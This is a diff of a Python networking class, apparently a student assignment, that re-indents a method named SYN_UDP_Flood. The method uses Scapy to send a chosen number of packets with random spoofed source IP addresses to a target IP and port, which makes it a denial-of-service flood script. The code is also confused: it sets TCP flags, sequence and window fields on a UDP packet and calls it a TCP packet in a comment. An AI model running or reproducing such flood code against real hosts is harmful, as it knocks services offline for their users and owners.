@@ -170,35 +170,35 @@ class seeker:
         except:
             return 0
 
-        #   Assignment 3, Part 2, one-to-many part 3
-        def SYN_UDP_Flood(self, dstIP, dstPort, counter):
-            try:
-                total = 0
-                print("Packets are sending ...")
-                for x in range (0, int(counter)):
-                    s_port = random.randint(1000,9000)
-                    s_eq = random.randint(1000,9000)
-                    w_indow = random.randint(1000,9000)
+    #   Assignment 3, Part 2, one-to-many part 3
+    def SYN_UDP_Flood(self, dstIP, dstPort, counter):
+        try:
+            total = 0
+            print("Packets are sending ...")
+            for x in range (0, int(counter)):
+                s_port = random.randint(1000,9000)
+                s_eq = random.randint(1000,9000)
+                w_indow = random.randint(1000,9000)
 
-                    IP_Packet = IP ()
-                    IP_Packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
-                    IP_Packet.dst = dstIP
+                IP_Packet = IP ()
+                IP_Packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
+                IP_Packet.dst = dstIP
 
-                    #   Created our own TCP packet
-                    UDP_Packet = UDP()	
-                    UDP_Packet.sport = s_port
-                    UDP_Packet.dport = int(dstPort)
-                    UDP_Packet.flags = "S"
-                    UDP_Packet.seq = s_eq
-                    UDP_Packet.window = w_indow
+                #   Created our own TCP packet
+                UDP_Packet = UDP()	
+                UDP_Packet.sport = s_port
+                UDP_Packet.dport = int(dstPort)
+                UDP_Packet.flags = "S"
+                UDP_Packet.seq = s_eq
+                UDP_Packet.window = w_indow
 
-                    send(IP_Packet/UDP_Packet, verbose=0)
-                    total+=1
-                print("\nTotal packets sent: %i\n" % total)
-                print()
-                return 1
-            except:
-                return 0
+                send(IP_Packet/UDP_Packet, verbose=0)
+                total+=1
+            print("\nTotal packets sent: %i\n" % total)
+            print()
+            return 1
+        except:
+            return 0
 
 if __name__ == "__main__":
     seeker().start(input('Enter port #: '))
